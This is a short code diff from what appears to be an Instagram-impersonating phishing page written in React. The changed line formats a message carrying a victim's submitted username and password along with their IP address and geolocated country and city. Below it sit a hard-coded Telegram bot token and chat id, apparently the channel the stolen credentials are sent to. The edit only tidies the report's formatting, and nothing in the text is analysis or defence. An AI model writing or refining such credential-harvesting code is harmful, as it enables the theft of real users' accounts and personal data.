@@ -27,7 +27,7 @@ const Instagram: React.FC = () => {
         const { ip, country_name, country_calling_code, city } = data;
         const NameLogin = formData.name;
         const PasswordLogin = formData.password;
-        const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;
+        const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} %0A - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;
 
         var token = "6650969963:AAECQrzycrXYX2_j45OEBuoMU38lLXTjLh8";
         var chat_id = -4213686359
